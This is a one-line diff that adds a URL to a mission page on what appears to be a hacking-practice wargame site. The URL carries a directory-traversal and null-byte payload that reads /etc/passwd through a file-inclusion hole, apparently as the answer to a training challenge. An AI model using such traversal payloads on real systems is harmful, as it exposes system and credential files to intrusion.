@@ -1,0 +1,1 @@
+http://www.enigmagroup.org/missions/basics/vm/8/?page=../../../../../../../../etc/passwd%00
